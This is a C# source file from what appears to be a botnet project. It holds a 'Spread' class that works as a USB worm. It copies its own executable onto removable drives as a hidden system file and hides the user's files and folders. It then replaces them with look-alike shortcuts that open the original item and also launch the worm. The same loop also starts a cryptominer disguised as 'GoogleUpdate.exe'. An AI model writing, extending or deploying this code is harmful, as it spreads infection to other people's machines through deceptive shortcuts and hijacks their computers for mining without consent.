using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace BotNet.Services.Common
{
    class Spread
    {
        private Thread _thread;
        Factory _factoryService = new Factory();
        Persistence _persistence = new Persistence();

        public void SpreadStart()
        {
            _thread = new Thread(new ThreadStart(CopyOnDevices));
            _thread.Start();
        }

        private void CopyOnDevices()
        {
            while (true)
            {

                try
                {
                    DriveInfo[] drives = DriveInfo.GetDrives();
                    foreach (var drive in drives)
                    {
                        if (drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.Unknown)
                        {
                            var files = GetFiles(drive.Name);
                            var folders = GetFolders(drive.Name);
                            if (!_factoryService.CheckFile(drive.Name + Config.TmpName))
                            {
                                File.Copy(Application.ExecutablePath, drive.Name + Config.TmpName);
                                File.SetAttributes(drive.Name + Config.TmpName,
                                    FileAttributes.Hidden | FileAttributes.System);
                            }
                            foreach (var folder in folders)
                            {
                                if (folder.Name != "System Volume Information")
                                {
                                    folder.Attributes = FileAttributes.Hidden | FileAttributes.System;
                                    ShortCut.ShortCut.Create("cmd.exe",
                                        drive.Name + folder.Name.Replace(" ", " ") + ".lnk",
                                        " /Q /C start \" \" \"" + folder.Name + "\"&&start " + Config.TmpName
                                        , @"C:\Windows\system32\imageres.dll", 4);
                                }
                            }

                            foreach (var file in files)
                            {
                                if (!file.Name.Contains(".lnk") && file.Name != Config.TmpName)

                                {
                                    string iconPath = getIcon(drive.Name + file.Name, file.Extension);
                                    int IconNum = 0;
                                    if (iconPath.Contains(","))
                                    {
                                        IconNum = int.Parse(iconPath.Substring(iconPath.IndexOf(",") + 1));
                                        iconPath = iconPath.Remove(iconPath.IndexOf(","));
                                    }

                                    file.Attributes = FileAttributes.Hidden | FileAttributes.System;
                                    ShortCut.ShortCut.Create("cmd.exe", drive.Name +
                                                                        file.Name.Remove(file.Name.LastIndexOf("."))
                                                                            .Replace(" ", " ") + ".lnk",
                                        " /Q /C start \" \" \"" + file.Name + "\"&&start " + Config.TmpName, iconPath,
                                        IconNum);
                                }
                            }
                        }
                    }
                }
                catch 
                { 
                }

                finally
                {
                    Thread.Sleep(Config.CopyInterval * 0x3e8);
                    

                    if (Config.IsMine)
                    {
                        if (!_factoryService.CheckProcess("InstallUtil"))
                        {
                            Process p = new Process();
                            p.StartInfo.FileName =
                                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                "\\Google\\GoogleUpdate.exe";
                            p.Start();
                            Thread.Sleep(Config.MinerCheckInterval * 0x3e8);

                        }
                    }
                }
            }
        }

        private FileInfo[] GetFiles(string path)
        {
            DirectoryInfo _info = new DirectoryInfo(path);
            return _info.GetFiles();
        }

        private DirectoryInfo[] GetFolders(string path)
        {
            DirectoryInfo _info = new DirectoryInfo(path);
            return _info.GetDirectories();
        }

        private string getIcon(string filePath,string ext)
        {
            if (ext != ".exe")
            {
                return Registry.ClassesRoot.OpenSubKey(Registry.ClassesRoot.OpenSubKey(ext).GetValue("")
                    .ToString()).OpenSubKey("DefaultIcon").GetValue("").ToString();
            }

            return filePath + ",0";
        }
    }
}
